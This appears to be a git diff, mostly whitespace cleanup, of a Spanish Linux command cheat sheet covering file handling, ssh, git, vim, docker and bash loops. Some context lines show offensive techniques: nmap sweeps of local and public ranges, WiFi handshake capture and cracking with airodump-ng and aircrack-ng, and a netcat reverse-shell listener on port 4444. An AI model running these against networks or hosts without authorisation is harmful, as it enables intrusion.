@@ -18,8 +18,6 @@ multipass launch -n bar --cloud-init cloud-config.yaml
 multipass launch lts --name ltsInstance --mem 2G --disk 10G --cpus 2
 ```
 
-
-
 #### Privilegios absolutos (root):
 
 ```
@@ -38,7 +36,7 @@ sudo -i
 sudo comando
 ```
 
-** Si olvidamos escribir sudo y nos da un error por ello, podemos usar `sudo!!` para ejecutar el comando anterior con sudo de prefijo.
+** Si olvidamos escribir sudo y nos da un error por ello, podemos usar `sudo !!` para ejecutar el comando anterior con sudo de prefijo.
 
 #### Para saber que distro de linux tienes:
 
@@ -159,7 +157,7 @@ yay -S vim code android-studio vlc
 mkdir carpeta
 ```
 ```
-cd /carpeta 
+cd /carpeta
 ```
 
 #### Regresar al directorio anterior:
@@ -192,7 +190,7 @@ echo "Texto corto" > nombre_archivo
  echo "Agregamos texto nuevo" >> nombre_archivo
 ```
 
-#### Si queremos aplicar un comando a un archivo, por ejemplo, un script mysql, usamos `<`. 
+#### Si queremos aplicar un comando a un archivo, por ejemplo, un script mysql, usamos `<`.
 
 ```
 mariadb --user=root --password -s < mariadb.sql
@@ -272,7 +270,7 @@ cp carpeta/archivo carpeta/
 
 ```
 ls
-ls -l 
+ls -l
 ```
 
 #### Para mover archivos seguimos el mismo razonamiento que al copiar. Mientras que si es una carpeta debemos agregar -r:
@@ -322,7 +320,7 @@ ls /bin/ && ls /usr/bin
 lsusb
 ```
 
-#### Para montar un disco, lo ubicamos con ``fdisk -l`` y luego 
+#### Para montar un disco, lo ubicamos con ``fdisk -l`` y luego
 ```
 sudo mount -rw /nombre/disco /mnt
 ```
@@ -355,7 +353,7 @@ dd bs=4M if=arch.iso of=/dev/sdb status=progress
 ss
 ss -l
 ss | grep tcp
-ss -t -a 
+ss -t -a
 ```
 
 #### Para conocer los usuarios logueados en el sistema:
@@ -668,7 +666,7 @@ Cambiar el orden de columnas:
 awk '{print $3, $1}' archivo.txt
 ```
 ```
-ps -ef | awk -F " " '{print $2}' 
+ps -ef | awk -F " " '{print $2}'
 ```
 
 Cortar una sección intermedia de filas:
@@ -683,7 +681,7 @@ seq 1 10
 ```
 
 Para buscar archivos:
- 
+
 ```
 sudo apt-get install mlocate
 ```
@@ -708,7 +706,7 @@ Instalar:
 
 ```
 sudo apt install openssh-server -y
-sudo systemctl enable ssh 
+sudo systemctl enable ssh
 sudo systemctl start ssh
 sudo systemclt status ssh
 ```
@@ -720,7 +718,7 @@ ssh-keygen
 ssh-copy-id -i ~/.ssh/id_rsa.pub UserName@RemoteServer
 ssh-add
 ```
-Sí hay una ``ssh key`` requerida: 
+Sí hay una ``ssh key`` requerida:
 
 ```
 ssh -i tu_ssh_key.pem user@server_ip
@@ -736,13 +734,13 @@ scp -P 22 -r /dir/ user@remote:~/Destino/
 Copiar archivos remoto --> local:
 
 ```
-scp user@ip:file.txt /path/to/dest 
+scp user@ip:file.txt /path/to/dest
 ```
 
 Y copiar archivos con llave:
 
 ```
-scp -r -i tu_ssh_key.pem tu_archivo user@server_ip:~ 
+scp -r -i tu_ssh_key.pem tu_archivo user@server_ip:~
 ```
 
 Para ejecutar comandos a distancia:
@@ -755,12 +753,12 @@ Para conectar fuera de la red local necesitamos la IP pública del router y habe
 
 ```
 ssh user@IP
-``` 
+```
 
 Firewall:
 
 ```
-ufw allow 22/tcp 
+ufw allow 22/tcp
 ufw allow 2222/tcp
 ufw allow from 202.54.1.1 to any port 22
 ufw limit ssh
@@ -782,7 +780,7 @@ Descargar archivos desde la terminal, por ejemplo, instalador de RStudio para De
 wget https://download1.rstudio.org/desktop/bionic/amd64/rstudio-1.2.5001-amd64.deb
 ```
 
-Para descargar archivos de un servidor o website. 
+Para descargar archivos de un servidor o website.
 
 ```
 wget -A pdf,csv,txt,png,jpg -m -p -E -k -K -np www.programandoconro.wordpress.com
@@ -819,13 +817,13 @@ Agregar un archivo concreto:
 git add /path/to/file
 ```
 ```
-git diff --cached 
+git diff --cached
 git commit -m 'comment'
 git commit --amend -m 'my corrected comment' # Para corregir el mensaje del commit anterior.
 ```
 ```
 git push -u origin master
-git checkout -b 'robranch' 
+git checkout -b 'robranch'
 git switch robranch # Cambiar de branch
 ```
 ```
@@ -844,14 +842,14 @@ git rm --cached myarchivo.txt
 ```
 Actualiza las branchs remotas localmente
 ```
-git remote update origin --prune 
+git remote update origin --prune
 ```
 Para hacer stash ("salvar los cambios" sin commit) y agregar un mensaje a dicho stash:
 ```
 git stash save "mensaje"
 ```
 
-Más opciones y comandos de git: 
+Más opciones y comandos de git:
 ```
 git init
 ```
@@ -872,7 +870,7 @@ git log --stat --summary
 git log --graph --decorate --oneline
 ```
 ```
-git help -a 
+git help -a
 git help -g
 ```
 
@@ -920,7 +918,7 @@ git config --global alias.ac '!git add . && git commit -m'
 
 * Buscar archivos que contengan una palabra específica en el código dentro de todo el repositorio con ``git grep 'palabra(s)'``
 
-* Guardar el estado actual del repositorio sin hacer commit con ``git stash``. Usando ``git stash pop`` volvemos al estado en el que estábamos trabajando. 
+* Guardar el estado actual del repositorio sin hacer commit con ``git stash``. Usando ``git stash pop`` volvemos al estado en el que estábamos trabajando.
 
 * Tutorial de git
   ``git help tutorial``
@@ -943,7 +941,7 @@ Move between windows: ``Ctrl b`` + n
 
 Resize panes:
 
-``Ctrl b`` + ``:`` + 
+``Ctrl b`` + ``:`` +
 
 ```
  resize-pane -D (Resizes the current pane down)
@@ -1040,9 +1038,9 @@ __Desplazamiento:__
 
 ``Ctrl O``  Navegar entre posiciones.
 
-`` '' ``  Navegar a la posición previa. 
+`` '' ``  Navegar a la posición previa.
 
-``f + {``  Va directamente al siguiente ``{``. 
+``f + {``  Va directamente al siguiente ``{``.
 
 Funciona para otros caracteres, por ejemplo: ``[ , ( , [a-z], [0-9] ,``, etc.
 
@@ -1060,7 +1058,7 @@ __Selección:__
 
 `v {` Seleccionar bloques hacia arriba
 
-`vat` Seleccionar html tag hacia abajo o arriba 
+`vat` Seleccionar html tag hacia abajo o arriba
 
 __Funcionalidades:__
 
@@ -1092,7 +1090,7 @@ Salir  ``Z Q``
 
 ``:V G d``  borrar todo el documento
 
-Borrar y editar directamente dentro de una función  ``c i {`` 
+Borrar y editar directamente dentro de una función  ``c i {``
 
 ``/``  buscar, ``n`` siguiente y ``N`` anterior
 
@@ -1124,7 +1122,7 @@ Seleccionar líneas con ``V`` y luego ``>>``.
 
 Autocompletar <- ``Ctrl x Ctrl o``, luego seleccionar con ``Ctrl n`` .
 
-Prettier para js, html, css ``Ctrl l``. 
+Prettier para js, html, css ``Ctrl l``.
 
 __Editar varias líneas al mismo tiempo:__
 
@@ -1136,7 +1134,7 @@ __Editar varios archivos en la misma pantalla__
 
 Editar un nuevo archivo: ``:e nombre_archivo``
 
-Dividir la pantalla verticalmente y abrir un nuevo archivo para editar: ``:vsplit nombre_archivo`` 
+Dividir la pantalla verticalmente y abrir un nuevo archivo para editar: ``:vsplit nombre_archivo``
 
 Para dividir horizontalmente usamos ``:split``
 
@@ -1146,9 +1144,9 @@ Con ``:hide`` podemos esconder la ventana, o simplemente ``:q``, ``:qa!`` o ``:w
 
 __Abrir la terminal sin salir de Vim:__
 
-Podemos usar ``:term`` o ``:vert term`` para que se divida la pantalla verticalmente. 
+Podemos usar ``:term`` o ``:vert term`` para que se divida la pantalla verticalmente.
 
-Adicionalmente, podemos usar ``Ctrl z`` para suspender Vim y luego ``fg`` en la terminal para regresar a vim. 
+Adicionalmente, podemos usar ``Ctrl z`` para suspender Vim y luego ``fg`` en la terminal para regresar a vim.
 
 Encapsular un ``tag``  con otro ``tag`` facilmente. Útil para react, react-native, etc...
 *Requiere el plugin ``surround``.
@@ -1188,7 +1186,7 @@ docker image prune -a # borra las imágenes no utilizadas
 docker system prune # elimina el cache, los containers e imágenes detenidas, etc.
 ```
 
-Para acceder a los puertos del localhost desde el contenedor: 
+Para acceder a los puertos del localhost desde el contenedor:
 
 ```
 docker run -it --network host example  
@@ -1211,10 +1209,10 @@ docker-compose stop
 
 ### Tor
 
-Para navegar de manera anónima.  Simplemente descargalo de https://www.torproject.org y: 
+Para navegar de manera anónima.  Simplemente descargalo de https://www.torproject.org y:
 
 ```
- tar -xvJf tor-browser-linux64-9.0.4_en-US.tar.xz 
+ tar -xvJf tor-browser-linux64-9.0.4_en-US.tar.xz
  ./tor-browser_en-US/Browser/start-tor-browser &
 ```
 
@@ -1239,8 +1237,8 @@ conda install face_recognition # (o pip install face_recognition)
 ```
 youtube-dl $url
 # solamente audio
-youtube-dl --extract-audio --format mp3 
-# Ver los formatos disponibles 
+youtube-dl --extract-audio --format mp3
+# Ver los formatos disponibles
 youtube-dl -F $url
 ```
 
@@ -1278,7 +1276,7 @@ apt-get install bastet moon-buggy ninvaders nsnake pacman4console neofetch figle
 ```
 bastet
 moon-buggy
-figlet HOLA AMIGO 
+figlet HOLA AMIGO
 ```
 
 El próximo comando te hará sentir en la matrix.
@@ -1288,13 +1286,13 @@ apt install cmatrix
 ```
 
 ```
-cmatrix 
+cmatrix
 telnet towel.blinkenlights.nl
 ```
 
 Factores en la terminal ``factor 12``
 
-Voltea la palabra que introduzcas ``rev`` agrega 123, por ejemplo. 
+Voltea la palabra que introduzcas ``rev`` agrega 123, por ejemplo.
 
 Repite un mensaje ``yes Viva Linux!!``
 
@@ -1308,7 +1306,7 @@ Instalar nuevos themes e íconos
 apt search shell-theme # o dnf en Fedora
 apt search icon-theme
 
-apt install ... # dnf install ... 
+apt install ... # dnf install ...
 ```
 
 ## COMANDOS NIVEL INTERMEDIO
@@ -1346,11 +1344,11 @@ ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -
 Tiempo de procesos
 
 ```
-echo "sudo apt update -y" > myUpdate.sh 
+echo "sudo apt update -y" > myUpdate.sh
 time bash myUpdate.sh
 ```
 
- Esperar 10 segundos. 
+ Esperar 10 segundos.
 
 ```
 sleep 10
@@ -1370,7 +1368,7 @@ rm -f /var/run/crond.pid #delete pid
 cron 00 00 * * * myUpdate.sh #todos los dias a las 12
 ```
 
-Cambiar el tamaño de las fuente en terminal. 
+Cambiar el tamaño de las fuente en terminal.
 
 ```
 dpkg-reconfigure console-setup
@@ -1416,7 +1414,7 @@ sudo mkfs -t vfat /dev/sdc1
 Controlar luz de la pantalla (Debes encontrar el archivo ``brightness``):
 
 ```
-echo 8 > /sys/class/backlight/intel_backlight/brightness 
+echo 8 > /sys/class/backlight/intel_backlight/brightness
 ```
 
 Escribir un script de varias líneas en la terminal sin usar un editor.
@@ -1450,11 +1448,11 @@ nmap localhost
 # Para evaluar la red local entera:
 nmap 192.168.1.1/24 #(o 192.168.0.1/24)
 
-#filtrar por puerto y estado 
+#filtrar por puerto y estado
 nmap -Pn 192.168.1.1/24 -p22 -open  
 
-# Auditar 
-nmap -Pn **PublicIP**/24 
+# Auditar
+nmap -Pn **PublicIP**/24
 ```
 
 ### SSH
@@ -1486,7 +1484,7 @@ Bloquear IPs que intenten conectar sin permiso
 iptables -A INPUT -s $IP -j DROP
 ```
 
- Elegir en cual servidor mostrar el display. 
+ Elegir en cual servidor mostrar el display.
 
 ```
 export DISPLAY=:0 # en el servidor local
@@ -1525,10 +1523,10 @@ iwconfig wlan1 mode monitor
 iwconfig
 airdump-ng
 airodump-ng -c 1 --bssid XX:XX:XX:XX:XX:XX:XX -w output wlan1
-aircrack-ng -b 00:14:6C:7E:40:80 output.cap -w mydiccionary.txt 
+aircrack-ng -b 00:14:6C:7E:40:80 output.cap -w mydiccionary.txt
 ```
 
-Escaneo de Redes Wifi Disponibles 
+Escaneo de Redes Wifi Disponibles
 
 ```
 sudo iwlist wlan0 scan | egrep "Cell|ESSID|Signal|Rates"
@@ -1541,7 +1539,7 @@ Reverse Shell:
 Desarrollador escucha en puerto 4444
 
 ```
- nc -lvp 4444 
+ nc -lvp 4444
 ```
 
 Cliente envía su Shell a la IP del desarrollador
@@ -1603,7 +1601,7 @@ sudo crontab -e
 watch ls
 ```
 
-Si desde otras ventana agregas unos archivos, podrás ver los cambios en ventana que ejecuta watch. 
+Si desde otras ventana agregas unos archivos, podrás ver los cambios en ventana que ejecuta watch.
 
 ### Crear tu propio comando.
 
@@ -1649,7 +1647,7 @@ Controla el audio:
 amixer scontrols
 ```
 
-Busca el dispositivo y ajustar el volumen 
+Busca el dispositivo y ajustar el volumen
 
 ```
 amixer sset 'PCM' 100%
@@ -1676,21 +1674,21 @@ vim /etc/motd
 
 ### For
 
-          for i in {1..10} ; do 
-              echo "hola $i"; 
+          for i in {1..10} ; do
+              echo "hola $i";
           done
-    
-    
+
+
             for i in $( ls ); do
                 echo item: $i;
                 sleep 1;
-            done 
-    
-    
+            done
+
+
             for i in `seq 1 10`; do
                     echo $i
             done    
-    
+
             for e in {0..9};do echo $e🍀; done;
 
 ### While
@@ -1698,7 +1696,7 @@ vim /etc/motd
              COUNTER=0
              while [  $COUNTER -lt 10 ]; do
                  echo The counter is $COUNTER
-                 let COUNTER=COUNTER+1 
+                 let COUNTER=COUNTER+1
              done
 
 ### Until
@@ -1713,10 +1711,10 @@ vim /etc/motd
 
              if [ hola == hola ]; then
                  echo TRUE;
-             else 
+             else
                  echo FALSE;
              fi
-    
+
              VAR="Hello Amit";
              if [[ $VAR == *Amit* ]];
                  then echo "its Amit";
